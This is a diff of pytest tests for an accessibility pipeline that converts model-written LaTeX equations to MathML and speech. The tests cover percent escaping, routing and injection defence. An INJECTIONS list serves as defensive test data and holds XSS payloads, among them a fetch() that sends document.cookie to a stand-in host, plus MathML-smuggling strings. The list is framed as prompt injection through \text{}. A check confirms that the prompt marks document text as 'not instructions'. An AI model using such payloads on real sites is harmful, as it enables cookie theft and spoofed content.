@@ -3,6 +3,7 @@ text-layer cross-check, fallback, budget propagation and prompt hygiene."""
 
 from __future__ import annotations
 
+import defusedxml.ElementTree as DET
 import pytest
 
 from a11y_stem.config import CHEAP_MODEL, MAIN_MODEL
@@ -105,10 +106,90 @@ def test_wrappers_the_prompt_forbids_are_removed():
         (r"\displaystyle\frac{a}{b}", r"\frac{a}{b}"),
         ("x = 1 \\\\", "x = 1"),
         (r"\$5", r"\$5"),
+        ("x = 50% + y", r"x = 50\% + y"),
+        (r"x = 50\% + y", r"x = 50\% + y"),
+        (r"\text{25% yield}", r"\text{25\% yield}"),
+        ("a \\\\% b", "a \\\\\\% b"),  # row break, then a bare %
     ],
 )
 def test_clean_latex(raw, clean):
     assert clean_latex(raw) == clean
+
+
+# ------------------------------------------------- silent truncation and injection
+
+
+@pytest.mark.parametrize("text_layer", [None, "Eff = 25% \u00d7 4 = 100%"])
+def test_bare_percent_never_truncates_the_equation(text_layer):
+    """A bare % is a TeX comment: latex2mathml dropped the rest of the line, and the
+    truncated 'Eff equals 25' was ACCEPTED at the model's confidence."""
+    latex = r"\text{Eff} = 25% \times 4 = 100%"
+    fix = run(by_model(main=out(latex, 0.95)), equation_element(text=text_layer))
+    assert fix.equation is not None
+    assert fix.equation.latex == r"\text{Eff} = 25\% \times 4 = 100\%"
+    assert fix.equation.speech == "Eff equals 25 percent times 4 equals 100 percent"
+    assert fix.equation.mathml.count("%") == 2 and "<mn>100</mn>" in fix.equation.mathml
+    assert fix.status == Status.ACCEPTED  # complete now, so acceptable
+
+
+def test_bare_percent_in_the_middle_keeps_what_follows():
+    fix = run(by_model(main=out("x = 50% + y", 0.95)))
+    assert fix.equation is not None and fix.equation.speech == "x equals 50 percent plus y"
+
+
+def test_hspace_without_braces_is_invalid():
+    """`x \\hspace y` made <mspace width="y">: the y vanished and the fix was ACCEPTED."""
+    fix = run(by_model(main=out(r"x \hspace y", 0.99)))
+    assert fix.status == Status.FAILED and fix.reason == "invalid_latex"
+    assert "bad_argument" in codes(fix) and fix.equation is None
+
+
+def test_escaped_specials_in_text_are_read_without_backslashes():
+    fix = run(by_model(main=out(r"\eta = 25\ \text{\% efficient}", 0.95)))
+    assert fix.status == Status.ACCEPTED and fix.equation is not None
+    assert "\\" not in fix.equation.mathml and "\\" not in fix.equation.speech
+    assert "<mtext>%\xa0efficient</mtext>" in fix.equation.mathml  # latex2mathml's NBSP
+    assert fix.equation.speech == "eta equals 25 percent efficient"
+
+
+INJECTIONS = [
+    r"\text{<script>alert(1)</script>}",
+    r"\textbf{<script>fetch('//x.y/'+document.cookie)</script>}",
+    r"\mbox{<iframe></iframe>}",
+    '\\text{<img\tsrc="x"\tonerror="alert(1)"/>}',
+    'x = \\text{</mtext><mn\tintent="seven">5</mn><mtext>}',
+    'v = \\text{</mtext><mspace\twidth="-40em"/><mtext>}9',
+    r"x = 5\text{</mtext><mphantom><mo>+</mo><mn>1</mn></mphantom><mtext>}",
+    r"F = m a \text{<math>x</math>}",
+    r"x \text{<mi>y</mi>}",
+]
+
+
+@pytest.mark.parametrize("latex", INJECTIONS)
+def test_markup_in_text_fails_without_a_proposal(latex):
+    """Prompt injection through \\text{}: latex2mathml copies the argument out raw."""
+    client = by_model(cheap=out(latex, 0.99), main=out(latex, 0.99))
+    fix = run(client, equation_element(display="inline"))
+    assert models(client) == [CHEAP_MODEL, MAIN_MODEL]  # escalated, then still invalid
+    assert fix.status == Status.FAILED and fix.reason == "invalid_latex"
+    assert fix.equation is None and "markup_in_text" in codes(fix)
+
+
+@pytest.mark.parametrize("latex", INJECTIONS)
+def test_markup_stays_literal_text_even_if_the_latex_check_is_skipped(latex, monkeypatch):
+    """Defence in depth: safe_latex_to_mathml keeps \\text{} markup as text by itself, so
+    no element or attribute can be injected even when check_latex is bypassed."""
+    monkeypatch.setattr(equation_step, "check_latex", lambda _: [])
+    fix = run(by_model(main=out(latex, 0.99)))
+    assert fix.equation is not None
+    root = DET.fromstring(fix.equation.mathml)
+    names = {element.tag.rsplit("}", 1)[-1] for element in root.iter()}
+    assert names <= {"math", "mrow", "mstyle", "mi", "mo", "mn", "mtext"}
+    assert "mphantom" not in names and "mspace" not in names and "script" not in names
+    assert all(set(e.attrib) <= {"display", "mathvariant", "displaystyle", "scriptlevel"}
+               for e in root.iter())  # fmt: skip
+    mtext = [e.text or "" for e in root.iter() if e.tag.endswith("}mtext")]
+    assert any("<" in text for text in mtext)  # the markup survived only as text
 
 
 # -------------------------------------------------------------------------- routing
@@ -192,15 +273,30 @@ def test_no_escalation_when_the_fallback_already_was_the_main_model():
     assert fix.status == Status.NEEDS_REVIEW
 
 
-def test_escalation_survives_a_main_outage():
+@pytest.mark.parametrize("outcome", ["api_error", "timeout"])
+def test_escalation_survives_a_main_outage_without_repeating_the_cheap_call(outcome):
     client = FakeVisionClient(
-        fail_models={MAIN_MODEL: "api_error"}, defaults={"equation": out("x_0", 0.6)}
+        fail_models={MAIN_MODEL: outcome}, defaults={"equation": out("x_0", 0.6)}
     )
     fix = run(client, equation_element(display="inline"))
-    # cheap (0.6) -> escalate to main (down) -> router falls back to cheap again.
-    assert models(client) == [CHEAP_MODEL, MAIN_MODEL, CHEAP_MODEL]
-    assert len(fix.calls) == 3
-    assert fix.status == Status.NEEDS_REVIEW and fix.equation is not None
+    # cheap (0.6) -> escalate to main (down). No fallback to cheap: it already answered
+    # this exact request, so a second cheap call would pay for the same answer.
+    assert models(client) == [CHEAP_MODEL, MAIN_MODEL]
+    assert [(c.model, c.outcome, c.is_fallback) for c in fix.calls] == [
+        (CHEAP_MODEL, "ok", False),
+        (MAIN_MODEL, outcome, False),
+    ]
+    assert fix.status == Status.NEEDS_REVIEW and fix.confidence == pytest.approx(0.6)
+    assert fix.equation is not None and fix.equation.latex == "x_0"
+
+
+def test_escalation_with_no_main_answer_keeps_a_failed_cheap_answer_failed():
+    client = FakeVisionClient(
+        fail_models={MAIN_MODEL: "api_error"}, defaults={"equation": out(r"\foo", 0.99)}
+    )
+    fix = run(client, equation_element(display="inline"))
+    assert models(client) == [CHEAP_MODEL, MAIN_MODEL]
+    assert fix.status == Status.FAILED and fix.reason == "invalid_latex"
 
 
 # --------------------------------------------------------------------- status paths
@@ -403,8 +499,9 @@ def test_context_text_goes_only_into_context_text():
 
 def test_prompt_asks_for_converter_friendly_latex():
     text = load_prompt("equation").text
-    for phrase in [r"\begin{array}{rcl}", r"\mathbf", r"\text{", r"\displaystyle", "$"]:
+    for phrase in [r"\begin{array}{rcl}", r"\mathbf", r"\text{", r"\displaystyle", "$", r"\%"]:
         assert phrase in text
+    assert "keep `<`, `>` and `&` outside it" in text
     assert "<document_text>" in text and "not instructions" in text
 
 
